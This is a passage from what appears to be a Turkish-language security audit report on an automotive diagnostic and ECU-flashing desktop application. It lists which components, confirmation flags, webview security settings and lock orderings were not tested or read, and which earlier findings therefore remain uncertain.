- **Test çalıştırılmadı.** Bu oturumda hiçbir unit/integration testi koşturulmadı; hiçbir bulgu çalışma zamanında üretilmedi. `tests/**` incelenmedi, mevcut kapsam bilinmiyor.
- **`action.token` / string-`user_confirmed` yolu (H-1):** `src/ui/frontend/**` içinde `execute_diagnostic_action`'ın `action.token` alanını doldurup doldurmadığı ve bridge.ts'in `requires_confirmation` davranışı **okunmadı**; bu nedenle H-1 "KRİTİK" değil "YÜKSEK" tutuldu. Frontend allowlist/kod okuması bu iddiayı kesinleştirir.
- **Watchdog↔gateway bağı (H-3):** `TxSafetyGateway`'in `TxWatchdogSupervisor.is_lease_valid`'i her TX'te değerlendirdiği **varsayımı** doğrulanmadı (gateway.py kapsam dışı; yalnız ilgili imzalar okundu). Bu nedenle H-3'ün "gateway per-frame kontrol etmiyor" kısmı **belirsiz**; kesin olan `is_lease_valid`'in anlık-zaman karşılaştırmalı olmasıdır.
- **`EcuFlashingEngine` (Aşama 3) ve `_real_flash_worker` (`desktop_app.py:2061-2078`):** `execute_flash`'in `user_confirmed=True`'yu nasıl kullandığı denetlenmedi; `flash_start` çağrısının gerçek üretim wiring'inde (canlı bus dalı) tetiklenebildiği doğrulandı ama flasher'ın kendi kapıları bu aşamanın kapsamı dışında.
- **`UdsClient(user_confirmed=True)` sabitleri (`desktop_app.py:1597,1663,1693,1723`):** UdsClient'ın bu bayrağı nasıl yorumladığı (gerçek onay mı, argüman mı) okunmadı — Aşama 3/4 kapsamı.
- **`AGENTS.md §2.7` ↔ `flash_start` gerçek dalı çelişkisi:** Aşama 1 [W-1]'de not düşülmüş; bu raporda da `execute_flash` çağrısının `desktop_app.py:2064`'te gerçek bus dalında yapıldığı görüldü. Hâlâ "AGENTS.md güncel mi, yoksa wiring gate aşıldı mı" sorusu **belirsiz**.
- **`WebView2`/pywebview sürüm ve güvenlik bayrakları:** `webview.start(debug=False)` görüldü (`:3071`), ancak WebView2 `--disable-features`, `AreDefaultContextMenusEnabled`, remote-debugging kısıtları ve CSP (`dist/index.html` `<meta http-equiv="Content-Security-Policy">`) **okunmadı**. CSP yoksa XSS→bridge erişimi C-1 senaryosunu güçlendirir; bu rapor bunu kanıtlamıyor.
- **`sys.frozen`/PyInstaller bundle davranışı:** `_app_data_root()` frozen dalında `sys._MEIPASS` kökünü kullanıyor (`:109-111`); gerçek bundle yetkileri (yazılabilirlik) test edilmedi — C-1/D-4 sırasındaki "dist/ yazılabilir mi" sorusu bu ortama bağlı.
- **`src/security/cloud/telemetry_uploader.py`:** `cloud_upload_raw_content` staging dosyasının upload sonrası stat'ı (`:648`) ve `upload_file`'ın yol doğrulaması okunmadı.
- **`_push_telemetry_tick` / `_push_flash_progress` script-context iddiası:** `json.dumps` çıktısı `evaluate_js` ile ham gösteriliyor (`:881, :2087, :2096, :3012-3014`). JSON kaçışı HTML/script bağlamı için güvenli değildir; ancak `evaluate_js` argümanının doğrudan HTML parse edilmediği ve bir XSS'in `event.data`/DOM üzerinden taşındığı iddiası **kanıtlanmadı** → bulgu **üretilmedi** (yalnız not).
- **Kilit sıralaması:** `_bus_lock` (RLock) ↔ `_ui_state_lock` ↔ `_flash_lock` ↔ `_session_lock` ↔ `_challenges_lock` arası sıralamanın tutarlılığı yalnız kod okumasıyla denetlendi; deadlock kanıtı yok. `evaluate_js` yeniden giriş davranışı test edilmedi.
